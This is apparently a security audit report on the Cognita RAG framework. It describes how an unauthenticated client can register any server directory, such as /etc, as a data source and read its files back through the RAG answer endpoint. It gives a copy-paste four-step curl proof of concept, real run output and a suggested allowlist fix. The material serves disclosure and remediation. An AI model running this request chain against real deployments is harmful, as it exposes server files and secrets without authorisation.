# Cognita localdir data source: unauthenticated registration of arbitrary server directories → contents become RAG-queryable

**Verification: DYNAMICALLY-REPRODUCED** (full chain over real HTTP: register → create collection → ingest → unauthenticated RAG query returns the victim file's content; output below is from the actual run)

## Reproduction conditions

- Cognita source snapshot (backend FastAPI app), Python 3.12, WSL2 Ubuntu 24.04, PostgreSQL + Qdrant via docker per the project's compose services
- No authentication (see the collections report) — attacker is anyone who can reach the API port
- Repro environment substitutions (model providers only, **zero changes to cognita code**): the configured embedder/LLM/unstructured endpoints were pointed at local OpenAI-compatible stubs that return deterministic embeddings / echo completions / the uploaded file's own text, since the audit machine has no external model API keys. The data-path code under test (loader, parser, indexer, retriever) is unmodified.

## Description

`POST /v1/data_source` accepts `{"type": "localdir", "uri": "<any server path>"}` with **no path validation and no allowlist** (`backend/server/routers/data_source.py`). During ingestion, `LocalDirectoryDataLoader.load_filtered_data` (`backend/modules/dataloaders/local_dir_loader.py:49`) executes `shutil.copytree(source_dir, dest_dir, dirs_exist_ok=True)` — it copies the **entire registered server directory** into the ingestion pipeline, logs its contents, and chunks every file into the collection's vector store. The registered directory can be any path readable by the server process (e.g. `/etc`, deployment dirs, other users' data).

## Impact

An unauthenticated client registers any server-side directory as a data source; after a single ingest call the directory's file contents are copied, chunked, embedded, and stored — and then returned to that same unauthenticated client by the RAG retrieval endpoint. This is arbitrary server-file disclosure through the product's own retrieval path.

## PoC (copy-paste ready — four steps; the old 2-step PoC in earlier revisions never triggered ingestion and did not work)

```bash
# 0. victim file on the server (any readable path)
echo "COGNITA_RAG_SECRET_42 the vault password is hunter2-demo" > /tmp/cog_vault/SECRET_FILE.txt

# 1. register the server directory as a data source (no auth)
curl -X POST http://<cognita>:8000/v1/data_source -H "Content-Type: application/json" \
  -d '{"type":"localdir","uri":"/tmp/cog_vault","metadata":{},"parser_config":{}}'
# -> {"data_source":{"type":"localdir","uri":"/tmp/cog_vault","fqn":"localdir::/tmp/cog_vault"}}

# 2. create a collection bound to it
curl -X POST http://<cognita>:8000/v1/collections -H "Content-Type: application/json" \
  -d '{"name":"exfil-coll","embedder_config":{"name":"<configured embedder>","parameters":{}},
       "associated_data_sources":[{"data_source_fqn":"localdir::/tmp/cog_vault","parser_config":{}}]}'

# 3. trigger ingestion — server copies and chunks the directory
curl -X POST http://<cognita>:8000/v1/collections/ingest -H "Content-Type: application/json" \
  -d '{"collection_name":"exfil-coll","data_source_fqn":"localdir::/tmp/cog_vault","run_as_job":false}'

# 4. read the contents back via RAG (no auth)
curl -X POST http://<cognita>:8000/retrievers/basic-rag/answer -H "Content-Type: application/json" \
  -d '{"collection_name":"exfil-coll","query":"What is the vault password?",
       "model_configuration":{"name":"<configured llm>","parameters":{}},
       "prompt_template":"...{context}...{question}...",
       "retriever_name":"vectorstore",
       "retriever_config":{"search_type":"similarity","search_kwargs":{"k":5}},
       "stream":false,"internet_search_enabled":false}'
```

## Execution result (actual run)

```
POST /v1/data_source localdir -> 201 {"data_source":{"type":"localdir","uri":"/tmp/cog_vault",...,"fqn":"localdir::/tmp/cog_vault"}}
POST create exfil-coll        -> 201
POST ingest                   -> 201 {"message":"triggered"}
qdrant points in exfil-coll   -> 1

RAG answer                    -> HTTP 500, secret disclosed: True
     response fragment: ...77331b4b', '_collection_name': 'exfil-coll'},
                   page_content='COGNITA_RAG_SECRET_42 the vault password is hunter2-demo')."}...

--- server.log (independent evidence of the copy stage) ---
local_dir_loader:load_filtered_data:34 - CURRENT DIR:..., Path exists: True, Dir contents: ['SECRET_FILE.txt']
local_dir_loader:load_filtered_data:51 - Dest dir contents: ['SECRET_FILE.txt']
local_dir_loader:load_filtered_data:61 - full_path: /tmp/tmpXXXX/SECRET_FILE.txt, rel_path: SECRET_FILE.txt, file_ext: .txt
```

The retrieval endpoint returned the victim chunk — `page_content='COGNITA_RAG_SECRET_42 the vault password is hunter2-demo'` — to the unauthenticated client. (In this snapshot the answer endpoint wraps the retrieved Document in a 500 due to an unrelated pydantic v1/v2 serialization incompatibility with modern dependencies; the retrieved secret content is in the response body, and the vector store (`qdrant points = 1`) independently confirms the content was ingested and queryable.)

## Suggested fix

Validate `localdir` URIs against a server-configured allowlist of permitted data directories; reject absolute paths outside it. Add authentication to the data-source API.
